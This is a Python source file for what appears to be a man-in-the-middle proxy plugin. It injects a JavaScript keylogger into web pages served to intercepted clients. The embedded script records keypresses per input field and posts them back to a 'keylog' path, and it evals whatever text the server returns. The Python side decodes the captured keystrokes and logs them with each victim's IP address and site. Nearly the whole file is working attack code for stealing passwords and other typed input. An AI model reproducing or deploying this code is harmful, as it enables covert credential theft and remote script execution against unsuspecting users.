from plugins.plugin import Plugin
from plugins.Inject import Inject
import logging

class jskeylogger(Inject, Plugin):
    name = "Javascript Keylogger"
    optname = "jskeylogger"
    desc = "Injects a javascript keylogger into clients webpages"
    implements = ["handleResponse", "handleHeader", "connectionMade", "sendPostData"]
    has_opts = False

    def initialize(self, options):
        Inject.initialize(self, options)
        self.html_payload = self.msf_keylogger()

        print "[*] Javascript Keylogger plugin online"

    def sendPostData(self, request):
        #Handle the plugin output
        if 'keylog' in request.uri:

            raw_keys = request.postData.split("&&")[0]
            keys = raw_keys.split(",")
            del keys[0]; del(keys[len(keys)-1])

            input_field = request.postData.split("&&")[1]            

            nice = ''
            for n in keys:
                if n == '9':
                    nice += "<TAB>"
                elif n == '8':
                    nice = nice.replace(nice[-1:], "")
                elif n == '13':
                    nice = ''
                else:
                    try:
                        nice += n.decode('hex')
                    except:
                        logging.warning("%s ERROR decoding char: %s" % (request.client.getClientIP(), n))

            #try:
            #     input_field = input_field.decode('hex')
            #except:
            #    logging.warning("%s ERROR decoding input field name: %s" % (request.client.getClientIP(), input_field))
            
            logging.warning("%s [%s] Field: %s Keys: %s" % (request.client.getClientIP(), request.headers['host'], input_field, nice))

    def msf_keylogger(self):
        #Stolen from the Metasploit module http_javascript_keylogger

        payload = """<script type="text/javascript">
window.onload = function mainfunc(){
var2 = ",";
name = '';
function make_xhr(){
    var xhr;
            try {
                xhr = new XMLHttpRequest();
            } catch(e) {
                try {
                    xhr = new ActiveXObject("Microsoft.XMLHTTP");
                } catch(e) {
                    xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
                }
            }
            if(!xhr) {
                throw "failed to create XMLHttpRequest";
            }
            return xhr;
        }
        
        xhr = make_xhr();
        xhr.onreadystatechange = function() {
            if(xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
                eval(xhr.responseText);
            }
        }

if (window.addEventListener) {
document.addEventListener('keypress', function2, true);
document.addEventListener('keydown', function1, true);
} else if (window.attachEvent) {
document.attachEvent('onkeypress', function2);
document.attachEvent('onkeydown', function1);
} else {
document.onkeypress = function2;
document.onkeydown = function1;
}

}

function function2(e)
{
    srcname = window.event.srcElement.name;
    var3 = (window.event) ? window.event.keyCode : e.which;
    var3 = var3.toString(16);
    
    if (var3 != "d")
    {
        andxhr(var3, srcname);
    }
}

function function1(e)
{
    srcname = window.event.srcElement.name;
    id = window.event.srcElement.id;

    var3 = (window.event) ? window.event.keyCode : e.which;
    if (var3 == 9 || var3 == 8 || var3 == 13)
    {
        andxhr(var3, srcname);
    }
    else if (var3 == 0)
    {
        
        text = document.getElementById(id).value;
        if (text.length != 0)
        {   
            andxhr(text.toString(16), srcname);
        }
    } 
}

function andxhr(key, inputName)
{   
    if (inputName != name)
    {
        name = inputName;
        var2 = ",";
    }

    var2= var2 + key + ",";

    xhr.open("POST", "keylog", true);
    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xhr.send(var2 + '&&' + inputName);
    
    if (key == 13 || var2.length > 3000)
    {
        var2 = ",";
    }
}
</script>"""

        return payload